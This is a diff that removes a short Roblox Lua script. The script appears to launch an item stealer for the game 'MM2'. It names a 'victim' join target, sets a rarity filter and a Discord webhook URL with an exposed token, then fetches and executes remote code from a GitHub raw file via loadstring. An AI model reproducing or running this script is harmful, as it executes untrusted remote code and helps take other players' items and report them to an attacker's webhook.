@@ -1,7 +1,0 @@
-_G.Username = "sw1kzo" -- user you should join victim on
-_G.min_rarity = "Godly"
-_G.min_value = 1 -- Put 1 to get all
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1363634982807142540/6G4vdD9NI1-NyqDonuro5okTx5rFx2GfmW_1cDI4VO0MhMtqUj0mpS1DFUug7D0r2fzM" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Dogge47/MM2/refs/heads/main/XHUB.exe.txt"))();
